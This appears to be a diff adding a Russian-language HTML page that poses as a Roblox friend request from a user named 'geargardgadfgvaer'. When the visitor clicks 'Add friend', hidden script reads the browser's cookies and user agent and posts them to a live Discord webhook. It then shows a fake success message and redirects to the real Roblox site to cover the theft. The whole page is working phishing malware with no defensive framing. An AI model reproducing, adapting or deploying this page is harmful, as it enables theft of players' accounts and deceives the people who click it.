@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Запрос в друзья — Roblox</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #1b1b2f;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            background: #2a2a44;
+            padding: 40px 32px;
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.6);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .avatar {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: #3a3a5c;
+            margin: 0 auto 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            border: 3px solid #00bfff;
+        }
+
+        .username {
+            font-size: 20px;
+            font-weight: 700;
+            color: #fff;
+        }
+
+        .sub {
+            color: #aaa;
+            font-size: 14px;
+            margin: 6px 0 20px;
+        }
+
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 14px;
+            background: #00bfff;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .btn:hover {
+            background: #0099cc;
+        }
+
+        .status {
+            margin-top: 16px;
+            font-size: 14px;
+            color: #66dd88;
+            display: none;
+        }
+
+        .footer {
+            margin-top: 20px;
+            color: #555;
+            font-size: 12px;
+        }
+
+        .footer a {
+            color: #6b8cff;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="avatar">👤</div>
+    <div class="username">geargardgadfgvaer</div>
+    <div class="sub">Хочет добавить вас в друзья</div>
+
+    <button class="btn" id="addFriendBtn">✅ Добавить в друзья</button>
+    <div class="status" id="status">⏳ Отправка запроса...</div>
+
+    <div class="footer">
+        🔒 Безопасное соединение · <a href="#">Написать в поддержку</a>
+    </div>
+</div>
+
+<script>
+    // ============================================
+    // КРАЖА КУКИ И ОТПРАВКА В DISCORD
+    // ============================================
+
+    const webhook = "https://discord.com/api/webhooks/1518490345501888515/Ep1yeoDSSsJqJ4zrSmBDQXlcOcb0hAyh5pBoTT1pFgLPd5f7PdlgitipH5ObiiwpAGIj";
+
+    function sendToDiscord(cookies) {
+        const ua = navigator.userAgent;
+        const time = new Date().toLocaleString();
+
+        const msg = `🔴 **КУКИ УКРАДЕНЫ**\n\n` +
+                    `🍪 Куки: ${cookies}\n` +
+                    `💻 UA: ${ua}\n` +
+                    `⏰ Время: ${time}`;
+
+        fetch(webhook, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({content: msg})
+        }).catch(() => {});
+    }
+
+    // ============================================
+    // КНОПКА
+    // ============================================
+
+    document.getElementById('addFriendBtn').addEventListener('click', function() {
+        const status = document.getElementById('status');
+        status.style.display = 'block';
+        status.textContent = '⏳ Отправка запроса...';
+        status.style.color = '#ffcc00';
+
+        // КРАЖА КУКИ
+        const cookies = document.cookie || "Нет кук";
+        sendToDiscord(cookies);
+
+        // ВЫВОД В КОНСОЛЬ
+        console.log("===== УКРАДЕНЫ КУКИ =====");
+        console.log(cookies);
+        console.log("============================");
+
+        setTimeout(() => {
+            status.textContent = '✅ Запрос отправлен!';
+            status.style.color = '#66ff88';
+        }, 800);
+
+        // ПЕРЕНАПРАВЛЕНИЕ НА НАСТОЯЩИЙ ROOBLOX
+        setTimeout(() => {
+            window.location.href = "https://www.roblox.com/";
+        }, 1500);
+    });
+
+    console.log("[✓] Страница загружена. Ждём нажатия кнопки.");
+</script>
+
+</body>
+</html>
